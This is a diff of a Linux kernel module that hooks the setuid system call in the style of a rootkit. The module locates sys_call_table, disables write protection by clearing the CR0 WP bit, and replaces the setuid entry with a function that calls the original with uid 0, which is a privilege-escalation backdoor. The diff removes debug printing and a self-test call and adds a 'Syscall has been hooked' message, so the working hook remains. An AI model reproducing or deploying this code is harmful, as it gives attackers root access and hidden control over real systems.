@@ -98,25 +98,17 @@ static asmlinkage int setuidReplacement(uid_t uid)
 	{
 		return original_syscall(0);
 	}
-	printk(KERN_ALERT "It didn't run :(\n");
 	return 0;
 }
 
 static int __init init_hook(void)
 {
-	long unsigned int temp;
-	int (*myFunc)(uid_t);
 	SysCallTable = (void*)FindMemoryLocationOfSETUID();  //Can be found using: grep "sys_call_table" /boot/System.map-`uname -r`
 	original_syscall = (asmlinkage int(*)(uid_t))SysCallTable[__NR_setuid];
-	temp = (long unsigned int)SysCallTable[__NR_setuid];
-	printk(KERN_ALERT "Previous syscall value was: %lud\n",temp);
 	write_cr0(read_cr0() & (~ 0x10000));
 	SysCallTable[__NR_setuid] = (void*)&setuidReplacement;
-	temp = (long unsigned int)SysCallTable[__NR_setuid];
-	printk(KERN_ALERT "New syscall value is: %lud & Our function location is: %lud\n",temp,(long unsigned int)&setuidReplacement);
 	write_cr0(read_cr0() | 0x10000);
-	myFunc = (void*) SysCallTable[__NR_setuid];
-	myFunc(0);
+	printk(KERN_ALERT "Syscall has been hooked");
 	return 0;
 }
 
